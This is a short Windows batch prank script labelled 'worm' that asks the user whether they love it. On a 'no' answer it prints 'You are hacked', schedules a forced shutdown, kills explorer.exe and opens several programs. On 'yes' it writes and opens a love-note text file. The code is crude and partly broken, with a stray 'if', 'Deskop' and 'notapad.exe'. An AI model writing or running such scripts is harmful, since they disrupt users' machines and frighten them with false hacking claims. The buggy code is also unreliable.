
:worm
@echo off
color 57
echo Hello, I love you!, love me?(only answer in yes or no)
set /p love=
if
if %love%==yes goto love
if %love%==no goto hate
:love
echo I LOVE YOU!!!
echo I love you too...
echo Meet you soon:)
cd Deskop
echo I love you! I love you too... :) :) :) lol>I love you worm.txt
start I love you worm.txt
pause
exit
:hate
echo BUT I LOVE YOU...HEHEHE
echo You are hacked...lol
echo Your pc will crash in 10 seconds
timeout 10
shutdown -s -t 10 -c "You are hacked lol!:)"
taskkill /f /im explorer.exe
start cmd.exe
start microsoft edge.exe
start notapad.exe
start charmap.exe
